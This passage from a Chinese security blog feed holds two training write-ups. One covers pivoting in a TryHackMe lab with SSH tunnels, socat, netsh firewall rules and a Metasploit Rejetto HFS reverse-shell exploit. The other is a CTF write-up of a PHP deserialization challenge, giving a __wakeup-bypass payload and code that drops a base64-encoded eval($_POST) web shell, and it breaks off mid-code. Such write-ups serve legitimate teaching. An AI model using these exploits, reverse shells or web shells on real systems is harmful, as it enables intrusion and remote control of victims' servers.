id="端口转发">端口转发</h5><p>我们介绍的大多数横向移动技术都需要攻击者可以使用特定端口。在实际网络中，管理员可能出于安全原因阻止了其中一些端口，或者在网络周围实施了分段，阻止您访问 SMB、RDP、WinRM 或 RPC 端口。</p><p>为了绕过这些限制，我们可以使用端口转发技术，即使用任何受感染的主机作为跳转箱来切换到其他主机。预计有些机器会比其他机器拥有更多的网络权限，因为企业中的每个角色对日常工作所需的网络服务都有不同的需求。</p><p><strong>SSH隧道</strong></p><p>我们将要研究的第一个协议是SSH ，因为它已经具有通过称为<strong>SSH隧道</strong>的功能进行端口转发的内置功能。虽然 SSH 曾经是与Linux系统相关的协议，但 Windows 现在默认附带 OpenSSH 客户端，因此您现在可以在许多系统中找到它，与操作系统无关。</p><p>SSH 隧道可以以不同的方式使用，通过 SSH 连接转发端口，我们将根据具体情况使用不同的方式。为了解释每种情况，我们假设一种情况，即我们已经获得了对 PC-1 计算机的控制权（不需要管理员访问权限），并希望将其用作枢纽，以访问我们无法直接连接的另一台计算机上的端口。我们将从 PC-1 计算机（充当 SSH 客户端）启动一条隧道，到攻击者的 PC（充当 SSH 服务器）。这样做的原因是，您通常会在 Windows 计算机上找到SSH客户端，但大多数时候没有可用的SSH服务器。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9fb527b63773be22aa214ea2d06d1351.png" alt="SSH 隧道"></p><p>因为我们要重新连接攻击者的机器，所以我们需要在其中创建一个无法访问任何控制台的用户以建立隧道，并设置一个用于创建隧道的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd tunneluser -m -d /home/tunneluser -s /bin/true</span><br><span class="line">passwd tunneluser</span><br></pre></td></tr></table></figure><p>根据您的需要，SSH 隧道可用于进行本地或远程端口转发。让我们分别看一下。</p><p><strong>SSH远程端口转发</strong></p><p>在我们的示例中，假设防火墙策略阻止攻击者的机器直接访问服务器上的端口 3389。如果攻击者之前已经入侵了 PC-1，而 PC-1 又可以访问服务器的端口 3389，则可以使用 PC-1 的远程端口转发将其转移到端口 3389。<strong>远程端口转发允许您从</strong>SSH客户端（在本例中为 PC-1）获取可访问的端口并将其投射到<strong>远程</strong>SSH 服务器（攻击者的机器）中。</p><p>结果，攻击者的机器上将打开一个端口，该端口可用于通过SSH隧道连接回服务器中的端口 3389。PC-1 将依次代理连接，以便服务器可以看到所有流量，就好像它来自 PC-1 一样：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49401a0687c38a1ce78fdd5852aca5a7.png" alt="SSH 远程端口转发"></p><p>此时可能会出现一个合理的问题，如果我们已经攻陷了 PC-1 并且可以直接从那里运行 RDP 会话，为什么我们需要端口转发。答案很简单：在我们只能通过控制台访问 PC-1 的情况下，我们将无法使用任何 RDP 客户端，因为我们没有 GUI。通过使端口可供攻击者的计算机使用，您可以使用 Linux RDP 客户端进行连接。当您想对无法直接访问的端口运行漏洞利用时，也会出现类似的情况，因为您的漏洞利用可能需要一种特定的脚本语言，而这种语言可能并不总是在您攻陷的计算机上可用。</p><p>参考上图，为了将服务器上的 3389 端口转发回攻击者的机器，我们可以在 PC-1 上使用以下命令：</p><p>PC1：命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N</span><br></pre></td></tr></table></figure><p>这将使用用户建立从 PC-1 到（攻击者 PC）的SSH会话。<code>1.1.1.1``tunneluser</code></p><p>由于<code>tunneluser</code>不允许在攻击者电脑上运行 shell，我们需要<code>ssh</code>使用<code>-N</code>开关以阻止客户端请求，否则连接将立即退出。<code>-R</code>switch 用于请求远程端口转发，语法要求我们首先指出我们将在 SSH 服务器上打开的端口 (3389)，然后是冒号，然后是我们将要转发的套接字的 IP 和端口 (3.3.3.3:3389)。请注意，端口号不需要匹配，尽管在本例中它们必须匹配。</p><p>该命令本身不会输出任何内容，但隧道将依赖于正在运行的命令。我们可以随时按 CTRL+C 来关闭隧道，就像使用任何其他命令一样。</p><p>一旦我们的隧道设置并运行，我们就可以进入攻击者的机器并通过RDP进入转发端口来到达服务器：</p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword</span><br></pre></td></tr></table></figure><p><strong>SSH本地端口转发</strong></p><p><strong>本地端口转发</strong>允许我们将 SSH 服务器的端口“拉”到 SSH 客户端。在我们的场景中，这可用于获取攻击者机器上可用的任何服务，并通过 PC-1 上的端口使其可用。这样，任何无法直接连接到攻击者 PC 但可以连接到 PC-1 的主机现在都能够通过枢纽主机访问攻击者的服务。</p><p>使用这种类型的端口转发可以让我们从通常无法连接回我们的主机运行反向 shell，或者简单地使任何我们想要的服务可供与我们没有直接连接的机器使用。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png" alt="SSH 本地端口转发"></p><p>为了从攻击者的机器转发端口 80 并使其在 PC-1 上可用，我们可以在 PC-1 上运行以下命令：</p><p>PC1：命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N</span><br></pre></td></tr></table></figure><p>该命令结构与远程端口转发中使用的命令结构类似，但使用<code>-L</code>本地端口转发选项。此选项要求我们指示 PC-1 用于接收连接的本地套接字 ( <code>*:80</code>) 以及从攻击者的 PC 角度要连接的远程套接字 ( <code>127.0.0.1:80</code>)。</p><p>请注意，我们在第二个套接字中使用 IP 地址 127.0.0.1，因为从攻击者的 PC 角度来看，这是持有要转发的端口 80 的主机。</p><p>由于我们在 PC-1 上打开了一个新端口，因此我们可能需要添加防火墙规则以允许传入连接（使用<code>dir=in</code>）。此操作需要管理权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Open Port 80&quot; dir=in action=allow protocol=TCP localport=80</span><br></pre></td></tr></table></figure><p>一旦建立起隧道，任何用户将其浏览器指向 PC-1 都<code>http://2.2.2.2:80</code>可以看到攻击者的机器发布的网站。</p><p><strong>使用 socat 进行端口转发</strong></p><p>在SSH不可用的情况下，可以使用 socat 执行类似的功能。虽然不如SSH灵活，但 socat 允许您以更简单的方式转发端口。使用 socat 的缺点之一是我们需要将其传输到枢纽主机（当前示例中的 PC-1），这使得它比SSH更容易被检测到，但在没有其他选择的情况下，它可能值得一试。</p><p>使用 socat 执行端口转发的基本语法要简单得多。如果我们想在主机上打开端口 1234 并将我们在那里收到的任何连接转发到主机 1.1.1.1 上的端口 4321，则可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321</span><br></pre></td></tr></table></figure><p>这<code>fork</code>选项允许 socat 为每个收到的连接派生一个新进程，从而可以处理多个连接而无需关闭。如果不包含它，socat 将在第一个连接完成时关闭。</p><p>回到我们的例子，如果我们想使用 PC-1 作为枢纽访问服务器上的端口 3389，就像我们使用SSH远程端口转发一样，我们可以使用以下命令：</p><p>PC-1：命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389</span><br></pre></td></tr></table></figure><p>请注意，socat 无法像 SSH 那样将连接直接转发到攻击者的机器，但会在 PC-1 上打开一个端口，然后攻击者的机器可以连接到该端口：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png" alt="SOCAT 端口转发 1"></p><p>与往常一样，由于在枢轴主机上打开了一个端口，我们可能需要创建防火墙规则来允许任何到该端口的连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Open Port 3389&quot; dir=in action=allow protocol=TCP localport=3389</span><br></pre></td></tr></table></figure><p>另一方面，如果我们想从攻击者的机器公开端口 80，以便服务器可以访问它，我们只需要稍微调整一下命令：</p><p>PC-1：命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80</span><br></pre></td></tr></table></figure><p>结果，PC-1 将生成端口 80 并监听转发到攻击者机器上的端口 80 的连接：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4874c8eb2e92a55b93c3dbbc2409e54b.png" alt="SOCAT 端口转发 2"></p><p><strong>动态端口转发和 SOCKS</strong></p><p>虽然单端口转发对于需要访问特定套接字的任务来说效果很好，但有时我们可能需要通过枢轴主机对主机的多个端口甚至多台机器的多个端口进行扫描。在这些情况下，动态端口转发<strong>允许</strong>我们通过主机进行枢轴扫描，并使用<strong>SOCKS 代理</strong>与任何我们想要的 IP 地址/端口建立多个连接。</p><p>由于我们不想依赖目标网络中 Windows 机器上现有的SSH服务器，因此我们通常使用SSH客户端通过以下命令建立反向动态端口转发：</p><p>PC1：命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@1.1.1.1 -R 9050 -N</span><br></pre></td></tr></table></figure><p>在这种情况下，SSH服务器将在端口上启动 SOCKS 代理，并通过SSH<code>9050</code>隧道转发任何连接请求，最终由SSH客户端代理。</p><p><strong>最有趣的部分是，我们可以使用proxychains</strong>通过 SOCKS 代理轻松使用我们的任何工具。为此，我们首先需要确保正确配置 proxychains 以将任何连接指向SSH用于 SOCKS 代理服务器的相同端口。可以在 AttackBox 上找到 proxychains 配置文件 <code>/etc/proxychains.conf</code>。如果我们向下滚动到配置文件的末尾，我们应该看到一行指示用于 socks 代理的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks4  127.0.0.1 9050</span><br></pre></td></tr></table></figure><p>默认端口是 9050，但只要与我们建立SSH隧道时使用的端口匹配，任何端口都可以使用。</p><p>如果我们现在想通过代理执行任何命令，我们可以使用代理链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl http://pxeboot.za.tryhackme.com</span><br></pre></td></tr></table></figure><p>请注意，某些软件（例如 nmap）在某些情况下可能无法与 SOCKS 很好地配合使用，并且可能会显示改变的结果，因此您的里程可能会有所不同。</p><h2 id="我们开始工作吧">我们开始工作吧！</h2><p>**注意：**由于您将使用从实验室网络到攻击者机器的SSH连接来完成<code>tunneluser</code> 此任务， 我们强烈建议您使用 Attackbox 或 VM 而不是实际机器。已给出有关创建不允许通过SSH /SCP 运行命令或传输文件的用户的说明，因此请务必按照说明进行操作。还建议创建一个强密码，<code>tunneluser</code> 并确保它是一个唯一且可丢弃的密码，而不是您在此平台或任何其他平台上的实际密码。</p><p>要完成此练习，您需要使用任务 1 中从http://distributor.za.tryhackme.com/creds分配给您的凭据连接到 THMJMP2 。如果您尚未这样做，请单击链接并立即获取凭据。获得凭据后，通过SSH连接到 THMJMP2 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh za\\&lt;AD Username&gt;@thmjmp2.za.tryhackme.com</span><br></pre></td></tr></table></figure><p>我们的第一个目标是通过RDP连接到 THMIIS。如果我们尝试直接从攻击者的机器连接，我们会发现端口 3389 已通过防火墙过滤，因此无法直接使用。但是，该端口已启动并运行，但只能从 THMJMP2 访问。通过使用THMJMP2 上可用的 socat，我们将转发 RDP 端口，使其在 THMJMP2 上可用，以便从攻击者的机器进行连接。</p><p>为此，我们将使用以下参数运行 socat：</p><p>THMJMP2：命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\socat\&gt;socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389</span><br></pre></td></tr></table></figure><p>请注意，我们不能将端口 3389 用于侦听器，因为 THMJMP2 已将其用于自己的 RDP 服务。请随意将侦听器端口 (13389) 更改为其他数字，以避免与其他学生发生冲突。在典型设置中，您必须添加防火墙规则以允许流量通过侦听器端口，但 THMJMP2 已禁用防火墙以方便您使用。</p><p>一旦设置了监听器，你就能够通过 THMJMP2 上的 socat 监听器，从攻击者机器通过RDP连接到 THMIIS：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020</span><br></pre></td></tr></table></figure><p><strong>隧道综合设施利用</strong></p><p>THMDC 服务器运行的是 Rejetto HFS 的一个易受攻击的版本。我们面临的问题是防火墙规则限制了对易受攻击端口的访问，因此只能从 THMJMP2 查看。此外，来自 THMDC 的出站连接仅允许连接到其本地网络中的计算机，因此无法直接将反向 shell 接收到攻击者的计算机上。更糟糕的是，Rejetto HFS 漏洞需要攻击者托管 HTTP 服务器来触发最终的有效负载，但由于不允许向攻击者的计算机进行出站连接，因此我们需要找到一种方法来在同一网络中的其他计算机之一中托管 Web 服务器，这一点都不方便。我们可以使用端口转发来解决所有这些问题。</p><p>首先，让我们看看漏洞是如何工作的。首先，它将连接到 HFS 端口（<code>RPORT</code>在 Metasploit 中）以触发第二个连接。第二个连接将针对 上的攻击者的机器进行<code>SRVPORT</code>，其中 Web 服务器将提供最终的有效负载。最后，攻击者的有效负载将执行并向 上的攻击者发送反向 shell <code>LPORT</code>：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/618de3db53e103f3df56ae922f66e879.png" alt="HFS 漏洞"></p><p>考虑到这一点，我们可以使用 SSH 将一些端口从攻击者的计算机转发到 THMJMP2（SRVPORT 用于 Web 服务器，LPORT 用于接收反向 shell），并通过 THMJMP2 到达 THMDC 上的 RPORT。我们需要在两个方向上进行三次端口转发，以便所有漏洞的交互都可以通过 THMJMP2 进行代理：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dbbc833670f1a7ed6f76eeac7d8bd1ee.png" alt="HFS 转发漏洞"></p><p>Rejetto HFS 将在 THMDC 上监听端口 80，因此我们需要使用远程端口转发通过 THMJMP2 将该端口隧道传输回攻击者的机器。由于攻击箱的端口 80 已被其他服务占用，因此我们需要将 THMDC 上的端口 80 与攻击箱当前未使用的某个端口链接起来。让我们使用端口 8888。在 THMJMP2 中运行 ssh 以转发此端口时，我们必须<code>-R 8888:thmdc.za.tryhackme.com:80</code>在命令中添加以下内容。</p><p>对于 SRVPORT 和 LPORT，我们随意选择两个端口。为了演示目的，我们将设置<code>SRVPORT=6666</code>和<code>LPORT=7878</code>，但请确保使用不同的端口，因为实验室是与其他学生共享的，因此如果你们两个选择相同的端口，则在尝试转发它们时，您将收到一条错误消息，指出该端口已在 THMJMP2 上使用。</p><p>为了将这些端口从我们的攻击者机器转发到 THMJMP2，我们将使用本地端口转发，方法是将<code>-L *:6666:127.0.0.1:6666</code>和 <code>-L *:7878:127.0.0.1:7878</code> 添加到我们的 ssh 命令中。这将绑定 THMJMP2 上的两个端口，并将任何连接隧道回我们的攻击者机器。</p><p>将整个命令放在一起，我们最终会得到以下内容：</p><p>THMJMP2：命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N</span><br></pre></td></tr></table></figure><p>**注意：**如果您正在使用 AttackBox 并且之前加入过其他网络房间，请务必选择分配给面向网络的隧道接口的 IP 地址<code>lateralmovementandpivoting</code>作为您的 ATTACKER_IP，否则您的反向 shell/连接将无法正常工作。为方便起见，连接到此网络的接口称为<code>lateralmovement</code>，因此您应该能够通过运行 来获取正确的 IP 地址<code>ip add show lateralmovement</code>：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b6b6f6f3ef517c092e52c4bca4941129.png" alt="img"></p><p>一旦所有端口转发都到位，我们就可以启动Metasploit并配置漏洞利用，以便所需端口与我们通过 THMJMP2 转发的端口相匹配：</p><p>攻击框</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfconsole</span><br><span class="line">msf6 &gt; use rejetto_hfs_exec</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set payload windows/shell_reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set lhost thmjmp2.za.tryhackme.com</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set ReverseListenerBindAddress 127.0.0.1</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set lport 7878 </span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set srvhost 127.0.0.1</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set srvport 6666</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set rhosts 127.0.0.1</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set rport 8888</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; exploit</span><br></pre></td></tr></table></figure><p>这里有很多内容需要解开：</p><ul><li><strong>LHOST</strong>参数 通常有两个用途：它用作在攻击者的机器上绑定侦听器以接收反向 shell 的 IP；它还嵌入在有效载荷中，以便受害者知道在触发漏洞时要重新连接的位置。在我们的特定场景中，由于 THMDC 无法联系我们，我们需要强制有效载荷重新连接 THMJMP2，但我们需要侦听器绑定到攻击者的机器上<code>127.0.0.1</code>。为此，Metasploit提供了一个可选参数<code>ReverseListenerBindAddress</code>，可用于指定攻击者机器上的侦听器绑定地址，与有效载荷将连接回的地址分开。在我们的示例中，我们希望反向 shell 侦听器绑定到攻击者机器上的 127.0.0.1，而有效载荷则连接回 THMJMP2（因为它将通过 SSH 隧道转发到攻击者机器）。</li><li>我们的漏洞利用还必须运行一个 Web 服务器来托管并将最终的有效负载发送回受害服务器。我们使用<strong>SRVHOST</strong>来指示监听地址，在本例中为 127.0.0.1，以便攻击者的机器将 Web 服务器绑定到本地主机。虽然这可能违反直觉，因为没有外部主机能够指向攻击者的机器本地主机，但 SSH 隧道将负责将在 SRVPORT 的 THMJMP2 上收到的任何连接转发回攻击者的机器。</li><li>RHOSTS设置为指向 127.0.0.1，因为<strong>SSH</strong>隧道将通过使用 THMJMP2 建立的 SSH隧道将请求转发到 THMDC。RPORT设置为 8888，因为发送到攻击者机器上该端口的任何连接都将转发到 THMDC 上的端口 80。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂题复现</title>
      <link href="/2024/05/02/%E6%9D%82%E9%A2%98/"/>
      <url>/2024/05/02/%E6%9D%82%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1>经典题目复现</h1><h2 id="天翼杯-2021-esay-eval">[天翼杯 2021]esay_eval</h2><p><strong>考点</strong>：<code>PHP反序列化</code>、<code>Redis主从复制</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析之后，我们有这样的思路：创建一个B类$b，然后b中有一个名为a的方法，而a是A类。当反序列化时，会执行B类的<code>__destruct</code>函数，执行<code>echo $this-&gt;a-&gt;a();</code>，因为A类不存在a方法，所以会执行<code>__call()</code>函数，从而执行<code>eval()函数</code></p><p>现在题中还有两个阻碍，一个类A中的<code>__wakeup</code>方法会将<code>code</code>的值置空，程序调用反序列化方法时，会自动执行<code>__weakup()</code>函数，利用php特性当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 <code>__weakup();</code>，第二个阻碍对传入参数作正则匹配，，匹配A类和B类名字后面的数目，要求必须为1，而我们要绕过<code>wakeup</code>需要大于1，这里利用php对类名大小写不敏感的特性去绕过</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:1:&quot;b&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>将b后成员列表个数修改后可得payload<code>?poc=O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</code></p><p><img src="https://s2.loli.net/2024/05/01/1WOdkU8JeixwaQp.png" alt="160391bdfe7f5018aa7ae7ccf585cd6a"></p><p>执行成功，发现<code>disable_functions</code>有过滤，无法直接RCE，利用<code>fputs</code>写入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;fputs(fopen(&#x27;dotast.php&#x27;,&#x27;w&#x27;),base64_decode(\&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ</span></span><br><span class="line"><span class="string">10pOw==\&quot;));&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable 